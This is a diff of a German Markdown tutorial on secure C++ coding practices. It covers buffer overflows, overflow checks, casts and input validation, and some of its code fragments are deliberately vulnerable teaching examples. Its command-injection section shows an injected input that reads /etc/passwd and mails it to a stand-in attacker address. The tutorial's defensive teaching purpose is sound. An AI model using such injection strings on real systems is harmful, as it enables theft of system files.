@@ -61,18 +61,18 @@ Verwenden Sie RAII, um Ressourcenlecks und Speicherfehler zu vermeiden.
 
 ### Verwende *Smart Pointer* <a name="link2"></a>
 
-C++ *Smart Pointer* können durchauas mit dem RAII Prinzip verglichen werden.
+C++ *Smart Pointer* können durchaus mit dem RAII Prinzip verglichen werden.
 *Smart Pointer* Objekte verwalten die Speicherzuweisung und -freigabe automatisch.
 
-Verwenden Sie Smart Pointer, um Speicherlecks und &bdquo;dangling&rdquo;&ndash;Zeiger zu vermeiden.
+Verwenden Sie *Smart Pointer*, um Speicherlecks und &bdquo;Dangling&rdquo;&ndash;Zeiger zu vermeiden.
 
 
 ### Verwende *Exception Handling* <a name="link3"></a>
 
 Die Standard C++ Ausnahmebehandlung ist eine Möglichkeit, Fehler und Ausnahmen im laufenden Programm zu behandeln.
 
-Verwenden Sie die Ausnahmebehandlung, um Fehler abzufangen und zu behandeln und zu verhindern,
-dass Ihr Programm abstürzt.
+Verwenden Sie die Ausnahmebehandlung, um Fehler abzufangen, zu behandeln und zu verhindern,
+dass das Programm abstürzt.
 
 ### Verwende die neuesten C++-Standards <a name="link4"></a>
 
@@ -90,7 +90,7 @@ Vermeiden Sie die Verwendung von Bibliotheken von Drittanbietern, die nicht auf 
 
 Starke Typisierung (*Strong Typing*) stellt sicher, dass Variablen nur für den vorgesehenen Zweck verwendet werden.
 
-Vorbei sind die Zeiten, in denen wir mit `void*` die Typprüfung umgangen haben.
+Der Gebrauch von `void*`&ndash;Zeigern kann nur die &bdquo;Ultima Ratio&rdquo; sein, da auf diese Weise jegliche Typprüfung umgangen wird.
 
 Vorbei sollte auch generell die Praxis sein, mit Hilfe des Castings eine strenge Typprüfung zu umgehen.
 
@@ -113,7 +113,7 @@ und andere Sicherheitslücken zu verhindern.
 Sollten Sie die Wahl haben: Verwenden Sie C++ und nicht C.
 
 Warum: C++ bietet bessere Typprüfungsmöglichkeiten und attraktivere Möglichkeiten in der Formulierung von Quellcode.
-Es bietet bessere Unterstützung für die Programmierung auf höherer Ebene
+C++ ermöglicht bessere Unterstützung für die Programmierung auf höherer Ebene
 und generiert häufig schnelleren Code.
 
 Diese Aussage findet sich auch in den [C++ Core Guidelines](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines)
@@ -121,15 +121,6 @@ wieder: *Prefer C++ to C* (*CPL.1*).
 
 Zur Illustration vergleiche man das Konkatenieren zweier Zeichenketten:
 Einmal in C++ geschrieben und ein zweites Mal in C:
-
-*Beispiel*: C++
-
-```cpp
-01: std::string first{ "Hello " };
-02: std::string second{ "World" };
-03: std::string result{ first + second };
-04: std::println("{}", result);
-```
 
 *Beispiel*: C
 
@@ -141,6 +132,15 @@ Einmal in C++ geschrieben und ein zweites Mal in C:
 05: strcpy_s(result, 20, first);
 06: strcat_s(result, 20, second);
 07: std::printf("%s\n", result);
+```
+
+*Beispiel*: C++
+
+```cpp
+01: std::string first{ "Hello " };
+02: std::string second{ "World" };
+03: std::string result{ first + second };
+04: std::println("{}", result);
 ```
 
 ---
@@ -174,7 +174,7 @@ Warning C4047 : '=': 'int' differs in levels of indirection from 'int *'
 Dies wird zwar vom C/C++ Compiler als Warnung eingestuft, es handelt sich hierbei aber um einen beinharten Fehler!
 
 *Bemerkung*:<br />
-Über *Errors* müssen wir nicht so viel reden: Bei Vorhandensein von Fehlern ist ein Programm überhaupt nicht übersetzungsfähig!
+Über *Errors* müssen wir nicht so viel reden: Beim Vorhandensein von Fehlern ist ein Programm überhaupt nicht übersetzungsfähig!
 
 ---
 
@@ -198,13 +198,13 @@ ein zu großer Warning Level kann zu viele Warnungen erzeugen, die nicht unbeding
 
 Eine Stärke der beiden Programmiersprachen C/C++ ist, dass beide das Konzept von &bdquo;Datentypen&rdquo; beherzigen.
 
-  * Man sollte tunlichst vermeiden, mit `void*` einzusetzen bzw. damit eine Typprüfung zu umgehen.
+  * Man sollte tunlichst vermeiden, `void*` einzusetzen bzw. damit eine Typprüfung zu umgehen.
 
   * Man sollte die Praxis des *Castings* vermeiden oder nur sehr behutsam einsetzen, um damit eine starke Typprüfung zu umgehen.
 
   * Ein Downcasting durch `reinterpret_cast` oder auf der Basis von C-Style-Casting sollte vermieden werden.
 
-  * Entfernen Sie *Constness* nicht mit mit `const_cast` oder mit C-Style-Casting, nur weil Sie es wollen oder der Compiler es erlaubt.
+  * Entfernen Sie *Constness* nicht mit `const_cast` oder mit C-Style-Casting, nur weil Sie es wollen oder der Compiler es erlaubt.
 
   * C-Style-Casting, Zeiger-Casting und `reinterpret_cast` sind im Allgemeinen riskant und können eine Quelle für ausnutzbare Fehler sein.
 
@@ -234,6 +234,9 @@ an einem Beispiel:
 12:     std::println("cmdLine: >{}<", cmdLine);
 13: }
 ```
+
+Erkennen Sie die Schwachstellen an diesem Code-Fragment?
+
 
 *Beispiel*: Einlesen der Kommandozeile - bessere Lösung
 
@@ -271,11 +274,10 @@ an einem Beispiel:
 31:         cmdLine[buflen] = '\0';
 32:     }
 33: 
-34:     // print created buffer 'cmdLine'
-35:     std::println("cmdLine: >{}<", cmdLine);
-36: 
-37:     free(cmdLine);
-38: }
+34:     std::println("cmdLine: >{}<", cmdLine);
+35: 
+36:     free(cmdLine);
+37: }
 ```
 
 *Ausgabe*:
@@ -284,12 +286,20 @@ an einem Beispiel:
 cmdLine: >one two three four <
 ```
 
+Die erste vorgestellte Variante verwendet für das Einlesen einen Puffer statischer Länge.
+
+Prinzipiell ist das machbar, aber es stellt eben keine perfekte Lösung dar.
+
+Zum einen sollten zu große statische Datenbereiche nicht auf dem Stack vorhanden sein,
+zum anderen ist man immer mit dem Problem konfrontiert, dass die übergebenen Datenbereiche umfangreicher sind.
+
+Eine optimale Lösung lässt sich nur unter Einsatz der dynamischen Datenverwaltung erzielen.
 
 ---
 
 ### Zweiter Tipp für Pufferüberlauf: Verwende ausschließlich &bdquo;*secure*&rdquo; Funktionen <a name="link13"></a>
 
-*Beispiel*: `strncpy_s`
+*Beispiel*: `strncpy_s` an Stelle von `strncpy`
 
 ```cpp
 01: void test() {
@@ -303,7 +313,7 @@ cmdLine: >one two three four <
 09:     auto size = std::size(buffer);
 10: 
 11:     // strncpy_s(buffer, size, str, length);      // crashes
-12:     strncpy_s(buffer, size, str, size - 1);       //  copy with adjusted boundary
+12:     strncpy_s(buffer, size, str, size - 1);       // copy with adjusted boundary
 13: 
 14:     buffer[size - 1] = '\0';
 15:     std::println("Destination: >{}<", buffer);
@@ -317,12 +327,12 @@ Source:      >This is way too long for this buffer<
 Destination: >This is way too<
 ```
 
-*Beispiel*: `snprintf`
+*Beispiel*: `snprintf` an Stelle von `sprintf`
 
 ```cpp
 01: void test() {
 02: 
-03:     constexpr int Size = 64;
+03:     const int Size = 64;
 04: 
 05:     char buffer[Size];
 06: 
@@ -346,7 +356,7 @@ Buffer: >The half of 60 is 30, and the half of that is 15.< // Bytes written: 29
 ```
 
 Es gibt für die CRT (*C-Runtime Library*) eine Überarbeitung der meisten Funktionen,
-um deren Parameter besser überprü+fen zu können:
+um deren Parameter besser überprüfen zu können:
 
 [Security Features in the CRT](https://learn.microsoft.com/en-us/cpp/c-runtime-library/security-features-in-the-crt?view=msvc-170)
 
@@ -371,14 +381,14 @@ Im Großen und Ganzen kann man sagen, dass man die kritischen Operationen zunächs
 umgehen muss. Bei der Addition und Subtraktion ist das durchaus möglich, man kann durch geschicktes Umordnen
 des arithmetischen Ausdrucks einen Überlauf verhindern.
 
-Bei der Multiplikation ist das etwas komplizierter. Ein Ansatz besteht darin, auf den nächstgrößeren Wertebereich umzusteigen,
-sofern dies möglich ist.
+Bei der Multiplikation ist das Ganze etwas komplizierter. Ein Ansatz besteht darin, auf den nächstgrößeren Wertebereich umzusteigen,
+sofern dies noch möglich ist.
 
 
 *Beispiel*: Addition
 
 ```cpp
-01: void overflow_addition() {
+01: void test_arithmetic_overflow_addition() {
 02: 
 03:     std::uint32_t a;
 04:     std::uint32_t b;
@@ -411,15 +421,31 @@ sofern dies möglich ist.
 31:     std::uint32_t b = std::numeric_limits<std::uint32_t>::max() / 2;
 32: 
 33:     addition_compliant(a, b);
-34: }
+34: 
+35:     a = a + 1;
+36: 
+37:     addition_compliant(a, b);
+38: 
+39:     a = a + 1;
+40: 
+41:     addition_compliant(a, b);
+42: }
 ```
 
+
+*Ausgabe*:
+
+```
+2147483647 + 2147483647 = 4294967294
+2147483648 + 2147483647 = 4294967295
+Sum of 2147483649 and 2147483647 is too large, cannot add !
+```
 
 
 *Beispiel*: Subtraktion
 
 ```cpp
-01: void overflow_subtraction() {
+01: void test_arithmetic_overflow_subtraction() {
 02: 
 03:     std::int32_t a;
 04:     std::int32_t b;
@@ -447,18 +473,30 @@ sofern dies möglich ist.
 26: 
 27: void test() {
 28: 
-29:     // for example
-30:     std::uint32_t a = std::numeric_limits<std::int32_t>::min() / 2;
-31:     std::uint32_t b = std::numeric_limits<std::int32_t>::max() / 2;
-32: 
-33:     subtraction_compliant(a, b);
-34: }
+29:     std::uint32_t a = std::numeric_limits<std::int32_t>::min() / 2;
+30:     std::uint32_t b = std::numeric_limits<std::int32_t>::max() / 2;
+31: 
+32:     subtraction_compliant(a, b);
+33: 
+34:     b = std::numeric_limits<std::int32_t>::max();   // removed "/ 2"
+35: 
+36:     subtraction_compliant(a, b);
+37: }
 ```
+
+*Ausgabe*:
+
+```
+-1073741824 - 1073741823 = -2147483647
+Cannot subtract 2147483647 from -1073741824! !
+```
+
+
 
 *Beispiel*: Multiplikation
 
 ```cpp
-01: void overflow_multiplication() {
+01: void test_arithmetic_overflow_multiplication() {
 02: 
 03:     std::int32_t a;
 04:     std::int32_t b;
@@ -470,7 +508,7 @@ sofern dies möglich ist.
 10: 
 11: int32_t multiplication_compliant(std::int32_t a, std::int32_t b) {
 12: 
-13:     // wanto switch from 32-bit to 64-bit arithmetic
+13:     // want to switch from 32-bit to 64-bit arithmetic
 14:     static_assert (sizeof (int64_t) >= 2 * sizeof(int32_t));
 15: 
 16:     std::int32_t result = 0;
@@ -492,17 +530,51 @@ sofern dies möglich ist.
 32: 
 33: void test() {
 34: 
-35:     // for example
-36:     std::int32_t a = 2;
-37:     std::int32_t b = 1;
-38: 
-39:     for (int i = 1; i < 32; ++i) {
-40: 
-41:         b = multiplication_compliant(a, b);
-42:         std::println("{}", b);
-43:     }
-44: }
+35:     std::int32_t a = 2;
+36:     std::int32_t b = 1;
+37: 
+38:     for (int i = 1; i < 32; ++i) {
+39: 
+40:         b = multiplication_compliant(a, b);
+41:     }
+42: }
 ```
+
+*Ausgabe*:
+
+```
+2 * 4 = 8
+2 * 8 = 16
+2 * 16 = 32
+2 * 32 = 64
+2 * 64 = 128
+2 * 128 = 256
+2 * 256 = 512
+2 * 512 = 1024
+2 * 1024 = 2048
+2 * 2048 = 4096
+2 * 4096 = 8192
+2 * 8192 = 16384
+2 * 16384 = 32768
+2 * 32768 = 65536
+2 * 65536 = 131072
+2 * 131072 = 262144
+2 * 262144 = 524288
+2 * 524288 = 1048576
+2 * 1048576 = 2097152
+2 * 2097152 = 4194304
+2 * 4194304 = 8388608
+2 * 8388608 = 16777216
+2 * 16777216 = 33554432
+2 * 33554432 = 67108864
+2 * 67108864 = 134217728
+2 * 134217728 = 268435456
+2 * 268435456 = 536870912
+2 * 536870912 = 1073741824
+Cannot multiply 2 with 1073741824! !
+```
+
+
 
 ---
 
@@ -542,7 +614,7 @@ Correct:                           4294967294
 
 Das Durchreichen von Zeichenketten an Subsysteme ist mit äußerster Vorsicht zu bewerkstelligen.
 
-So genannte *SQL-Injections*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.
+So genannte *SQL-Injection*-Angriffe sind eine der ältesten Schwachstellen in derartigen Programmen.
 
 Eine SQL-Injection ist eine Art von Sicherheitslücke,
 bei der ein Angreifer einen Teil des SQL-Codes (*Structured Query Language*) verwendet,
@@ -579,7 +651,7 @@ Buffer (Input):   /bin/mail bogus@addr.com; cat /etc/passwd | mail somebadguy.ne
 Jegliche Form eine Benutzereingabe ist zu validieren.
 
 In diesem Zusammenhang gibt es den Begriff der &bdquo;Whitelist&rdquo;:
-Hierunter versteht man eine Art  &bdquo;weiße Liste&rdquo;, eine Art Filter dar,
+Hierunter versteht man eine Art &bdquo;weiße Liste&rdquo;, eine Art Filter,
 der die sicheren Daten beschreibt und filtert.
 
 *Beispiel*:
@@ -622,7 +694,7 @@ der die sicheren Daten beschreibt und filtert.
 35: }
 ```
 
-Die so genannte  &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
+Die so genannte &bdquo;Whitelist&rdquo; finden wir in dem Programmausschnitt
 in den Zeilen 4 bis 6 vor: Eine Menge aller zulässigen Zeichen in diesem Beispiel.
 
 *Ausgabe*:
@@ -665,6 +737,14 @@ jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!
 16: }
 ```
 
+*Antwort*:
+
+Die folgenden Zeilen sind entweder falsch oder extrem unsicher geschrieben:
+
+  * Zeile 4
+  * Zeile 6
+  * Zeile 11
+  * Zeile 13
 
 ---
 
@@ -672,7 +752,7 @@ jede Zeile des Quellcodes mit dem Debugger zu durchlaufen!
 
 Algorithmen der STL sind robuster im Gebrauch als CRT-Bibliotheksfunktionen oder selbst geschriebene Funktionen.
 
-*Beispiel*:
+*Beispiel (C++)*:
 
 ```cpp
 01: std::string str{ "Hello World" }; // use also "Hello:World"
@@ -691,7 +771,7 @@ Algorithmen der STL sind robuster im Gebrauch als CRT-Bibliotheksfunktionen oder
 ```
 
 
-*Beispiel*:
+*Beispiel (C)*:
 
 ```cpp
 01: char str[] = "Hello World";    // use also "Hello:World"
@@ -719,6 +799,7 @@ Beide kommen ohne Schleifen-Indizes aus, die eine häufige Ursache von Fehlerquel
 
 ### Verwende STL-Container <a name="link19"></a>
 
+*Beispiel*:
 
   * `std::string`
   * `std::vector`
@@ -731,7 +812,7 @@ An Stelle der unsicheren C-Cast Operatoren sollten man die sicheren C++-Cast Ope
 
 Ein Beispiel ist der Gebrauch von `static_cast`:
 
-*Beispiel*:
+*Beispiel (C++)*:
 
 ```cpp
 01: class Spiderman {};
@@ -747,21 +828,27 @@ Ein Beispiel ist der Gebrauch von `static_cast`:
 11: }
 ```
 
-*Beispiel*:
+*Beispiel (C)*:
 
 ```cpp
-01: class Spiderman {};
-02: class Ironman {};
+01: struct Spiderman {};
+02: struct Ironman {};
 03: 
 04: void test() {
 05: 
-06:     Spiderman* ptr = new Spiderman;
-07:     Ironman* ptr2 = NULL;
+06:     struct Spiderman* ptr = (struct Spiderman*) malloc(sizeof(struct Spiderman));
+07:     struct Ironman* ptr2 = NULL;
 08: 
-09:     // compiles (!)
-10:     ptr = (Spiderman*) ptr;
-11: }
+09:     // warning C4133: '=': incompatible types - from 'Spiderman *' to 'Ironman *'
+10:     // this line compiles (!!!) using a C Compiler (needs a file with extension .c)
+11:     ptr2 = (struct Spiderman*)ptr;
+12: }
 ```
+
+Das letzte Code-Fragment ist in C übersetzungsfähig !!! 
+Dabei müssen diese Anweisungen natürlich in einer Datei mit der Endung &bdquo;.c&rdquo; stehen.
+
+Dieselben Anweisung sind in C++ nicht übersetzungsfähig!
 
 ---
 
@@ -787,7 +874,7 @@ Wer hat wann und wo `delete` aufgerufen?
 
 ### Deklariere Konstruktoren mit einem einzigen Argument mit `explicit` <a name="link22"></a>
 
-Standardmäßig sollten Konstruktoren mit einem Argument als  `explicit` deklariert werden.
+Standardmäßig sollten Konstruktoren mit einem Argument als `explicit` deklariert werden.
 Damit kann man unbeabsichtige Konvertierungen &ndash; und damit Überraschungen &ndash; vermeiden:
 
 ```cpp
@@ -902,9 +989,9 @@ Der genaue Datentyp ist implementierungsspezifisch, ist aber normalerweise eine 
 
 Man sollte `size_t` einsetzen
 
-  * für etwaige Größenangaben von Objekten
-  * für Container-ähnliche Objekte und deren Größe
-  * für Array-Indizierung und Schleifenzähler
+  * für etwaige Größenangaben von Objekten,
+  * für Container-ähnliche Objekte und deren Größe und
+  * für Array-Indizierung und für Schleifenzähler.
 
 
 ---
@@ -922,7 +1009,7 @@ erheblich lesbarer gestalten:
 03: // auto wrong = h + d;   // doesn't compile: Error
 ```
 
-Dazu bedarf es der Implementierung des so genannten *Literal*-Operators:
+Dazu bedarf es einer Implementierung des so genannten *Literal*-Operators:
 
 ```cpp
 01: class Hours{
@@ -960,27 +1047,39 @@ Möchte man mit derartigen Konstanten auch Arithmetik betreiben können, geht das 
 Man muss in diesem Fall die *Literal*-Operatoren nur anders definieren:
 
 ```cpp
-01: using hours = unsigned long long;
-02: 
-03: constexpr hours operator"" _hours(unsigned long long hours) {
-04:     return hours;
-05: }
-06: 
-07: constexpr hours operator"" _days(unsigned long long hours) {
-08:     return hours * 24;
-09: }
-10: 
-11: constexpr hours operator"" _weeks(unsigned long long hours) {
-12:     return hours * 7 * 24;
-13: }
+01: constexpr unsigned long long operator"" _hours(unsigned long long hours) {
+02:     return hours;
+03: }
+04: 
+05: constexpr unsigned long long operator"" _days(unsigned long long hours) {
+06:     return hours * 24;
+07: }
+08: 
+09: constexpr unsigned long long operator"" _weeks(unsigned long long hours) {
+10:     return hours * 7 * 24;
+11: }
+12: 
+13: void test_use_user_defined_literals() {
 14: 
-15: void test() {
+15:     auto hours = 12_hours;
 16: 
-17:     auto hours = 12_hours;
-18:     auto days = 2_days;
-19:     auto weeks = 3_weeks;
-20:     auto totalHours = weeks + days + hours;
-21: }
+17:     auto dayHours = 2_days;
+18: 
+19:     auto weekHours = 3_weeks;
+20: 
+21:     auto totalHours = weekHours + dayHours + hours;
+22: }
+23: 
+24: void test_use_user_defined_literals_constexpr() {
+25: 
+26:     constexpr auto hours = 12_hours;
+27: 
+28:     constexpr auto dayHours = 2_days;
+29: 
+30:     constexpr auto weekHours = 3_weeks;
+31: 
+32:     constexpr auto totalHours = weekHours + dayHours + hours; // 12 + 2*24 + 3*7*24 = 564
+33: }
 ```
 
 ---
